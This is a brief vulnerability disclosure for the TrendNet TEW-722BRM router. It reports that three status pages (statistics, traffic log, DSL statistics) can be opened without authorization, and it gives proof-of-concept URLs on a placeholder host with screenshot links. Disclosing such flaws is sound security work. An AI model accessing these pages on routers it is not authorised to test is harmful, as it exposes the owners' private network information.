#### Vulnerability Detail
There are several pages in TrendNet TEW-722BRM can be accessed without authorization, which could lead to the leak of vital private information.These pages are "status/status_statistic.shtml", "status/traffic_log.shtml", "status/status_vdsl_statistic.shtml". When processed, it exposes the statistic, traffic log and DSL statistic of router.

#### PoC
http://targetip/status/status_statistic.shtml

![poc](status_statistic.jpg)

http://targetip/status/traffic_log.shtml

![poc](traffic_log.jpg)

http://targetip/status/status_vdsl_statistic.shtml

![poc](DSL_statistic.jpg)


